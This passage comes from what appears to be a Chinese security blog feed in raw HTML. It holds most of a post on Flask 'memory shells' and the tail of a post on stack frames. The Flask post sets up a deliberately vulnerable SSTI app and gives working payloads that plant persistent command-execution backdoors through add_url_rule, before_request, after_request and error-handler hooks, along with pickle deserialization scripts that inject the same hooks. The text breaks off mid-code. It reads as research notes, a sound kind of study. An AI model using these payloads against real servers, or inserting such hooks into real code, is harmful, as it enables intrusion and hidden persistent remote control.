punctuation">.</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编大致如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_MyFunction:    push ebp    mov  ebp, esp    ...    mov esp, ebp    pop ebp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的<code>ret</code>指令，相当于<code>pop + jump</code>，它首先将数据（返回地址）弹出栈并保存到<code>eip</code>中，然后处理器根据这个地址无条件地跳到相应位置获取新的指令</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810191735985.png" alt="image-20240810191735985"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;看CVE-2024-2961的时候卡在了需要二进制基础的部分，于是从这里开始正式接触一下二进制安全的内容&lt;/p&gt;
&lt;p&gt;参考原文：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/cyberangel/rg9gdm/gcz7x2&quot;&gt;https://www.yuque.com/cyberangel/rg9gdm/gcz7x2&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="http://c1oudfl0w0.github.io/blog/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask内存马</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-08-09T12:53:34.000Z</published>
    <updated>2024-08-19T09:20:04.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>年轻人学的第一个内存马，竟然不是java（</p><p>看大伙好像前几个月都在研究这个，学一下，顺带复健一下，已经摸了两周🐟了</p><p>参考：</p><p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p><p><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://xz.aliyun.com/t/14421">https://xz.aliyun.com/t/14421</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><span id="more"></span><hr><p>先准备一个Flask SSTI漏洞环境：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    person <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        person <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    template <span class="token operator">=</span> <span class="token string">'&lt;h2>Hello %s!&lt;/h2>'</span> <span class="token operator">%</span> person    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="debug模式下不出网回显"><a href="#debug模式下不出网回显" class="headerlink" title="debug模式下不出网回显"></a>debug模式下不出网回显</h1><p>在debug模式下，报错会带出详细信息，debug模式常见的考点有算pin码进console来命令执行</p><p>其实我们也可以通过手动报错<code>raise Exception()</code>的方式来让我们的命令回显</p><p>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"raise Exception(__import__('os').popen('whoami').read())"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809214712376.png" alt="image-20240809214712376"></p><hr><p>接下来关闭debug模式，开始研究🐎</p><h1 id="低版本内存马"><a href="#低版本内存马" class="headerlink" title="低版本内存马"></a>低版本内存马</h1><p>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为懒得搞低版本的flask了，这里对payload里的关键部分稍微分析一下就过了</p><p>在eval中，执行了这样一个东西：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">"app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>top<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>"<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显，这里调用了Flask对象的<code>add_url_rule</code>方法</p><h2 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule"></a>add_url_rule</h2><p>在Flask中注册路由是使用<code>@app.route()</code>装饰器来实现的，看一下其源码实现：</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213132894.png" alt="image-20240809213132894"></p><p>可以看到这里用了<code>add_url_rule</code>来添加路由，这几个参数的说明：</p><ul><li>rule：函数对应的URL规则，满足条件和 app.route() 的第一个参数一样，必须以<code>/</code>开头；</li><li>endpoint：端点，即在使用 url_for() 进行反转的时候，这里传入的第一个参数就是 endpoint 对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为 endpoint 的值；</li><li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号），下面的图对照的就是<code>def home()</code>；</li><li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options &#x3D;添加规则前为False；</li><li>options：要转发到基础规则对象的选项。Werkzeug 的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听 GET（并隐式地侦听HEAD）</li></ul><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213643592.png" alt="image-20240809213643592"></p><p>对照一下payload，可以知道这里添加了一条路由，处理该路由的函数是个由lambda关键字定义的匿名函数</p><hr><h2 id="获取app上下文"><a href="#获取app上下文" class="headerlink" title="获取app上下文"></a>获取app上下文</h2><h3 id="低版本中-request-ctx-stack"><a href="#低版本中-request-ctx-stack" class="headerlink" title="低版本中_request_ctx_stack"></a>低版本中_request_ctx_stack</h3><p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例</p><blockquote><p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中</p></blockquote><p>也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code>，这里等价于获取了<code>&lt;Flask &#39;app&#39;&gt;</code></p><p>那么<code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>就能获取cmd参数</p><h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="新版内存马"><a href="#新版内存马" class="headerlink" title="新版内存马"></a>新版内存马</h1><p>测试版本：Flask 2.2.0</p><p>不知道从哪个版本开始，flask不再支持在程序运行的过程中通过<code>add_url_rule</code>添加路由</p><p>那就得另辟蹊径了</p><p>这里可以利用<code>@app.before_request</code>或者<code>@app.after_request</code>这两个底层函数来打</p><p>接下来先以下面这个路由进行测试：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/e'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"1"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h2><blockquote><p>在 Flask 中，<code>before_request</code> 是一个装饰器，它用于在请求处理之前执行特定的函数。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>像上面这个demo就是检测请求 headers 有无 Authorization 字段来实现身份认证</p><p>跟进一下这个装饰器</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004201760.png" alt="image-20240810004201760"></p><p>可以看到这里实际上调用的是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>作用是：</p><ul><li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li><li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li><li>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</li></ul><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004555015.png" alt="image-20240810004555015"></p><p>那么这个<code>f</code>就是我们添加的函数了，于是我们同样可以自定义一个 lambda 函数，这样在每次发起请求前就都会触发了</p><p>于是可以构造我们的payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810005710518.png" alt="image-20240810005710518"></p><p>第一次写入进去，之后所有的访问请求都会返回123</p><p>不过弊端也很明显，使用lambda必然会得到一个返回值，那么服务后续的操作都无法进行，会影响到主机的正常业务</p><hr><h2 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h2><p>和 before_request 相反，<code>after_request</code>会在请求结束得到响应包之后进行操作</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810010120613.png" alt="image-20240810010120613"></p><p>和前面那个一样，唯一要注意的是这个需要定义一个返回值，不然就会报错</p><p>构造payload：（注意，在本人的测试版本上需要提前在代码中导入对应的包才可打入payload）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>after_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'global CmdResp;CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">else</span> resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>函数的内容为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> <span class="token comment"># 传入参数</span>    CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span>      <span class="token comment"># 如果请求参数含有cmd则返回命令执行结果</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>'        <span class="token keyword">global</span> CmdResp<span class="token punctuation">;</span>     <span class="token comment"># 定义一个全局变量，方便获取</span>        CmdResp<span class="token operator">=</span>make_response<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span>\'cmd\'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 创建一个响应对象</span>    '<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span>    <span class="token comment"># 恒真</span>    <span class="token keyword">else</span> resp<span class="token punctuation">)</span>  <span class="token comment"># 如果请求参数没有cmd则正常返回</span><span class="token comment"># 这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打入后就getshell了</p><hr><h2 id="其它的钩子"><a href="#其它的钩子" class="headerlink" title="其它的钩子"></a>其它的钩子</h2><p>都是gxngxngxn师傅找到的，tql</p><p><code>teardown_request</code>：跟前面<code>after_request</code>的类似，payload也通用，改个调用的底层函数名就行，但是无回显。。</p><h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><blockquote><p>该函数用于自定义404页面的回显</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">errortest</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error_handler(404)'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'404 Err0r'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012504500.png" alt="image-20240810012504500"></p><p>跟进这个装饰器的底层逻辑</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012603684.png" alt="image-20240810012603684"></p><p>发现眼熟的东西，当然按照旧版内存马的方式直接调用<code>register_error_handler</code>同样是不行的</p><p>但是值得注意的是，这里传入<code>register_error_handler</code>的参数有<code>code_or_exception</code>和<code>f</code></p><p><code>f</code>依旧是我们可控的函数，那么接下来就是要构造<code>code_or_exception</code>使得<code>code</code>和<code>exc_class</code>也可控，在前面<code>code_or_exception</code>的值为404</p><p>跟进一下<code>_get_exc_class_and_code</code></p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810013648894.png" alt="image-20240810013648894"></p><p>那这还构造个啥，直接<code>_get_exc_class_and_code(404)</code>，这样就能返回常规的变量了</p><p>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810014235559.png" alt="image-20240810014235559"></p><hr><h2 id="ssti利用"><a href="#ssti利用" class="headerlink" title="ssti利用"></a>ssti利用</h2><p>考虑到上下文没有导入包的情况</p><p>注：部分flask版本下无法使用<code>url_for.__globals__[&#39;current_app&#39;]</code>来获取app，因此这里改用<code>sys.modules</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810011718358.png" alt="image-20240810011718358"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"exec(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()\")"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="pickle利用"><a href="#pickle利用" class="headerlink" title="pickle利用"></a>pickle利用</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('cmd')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token 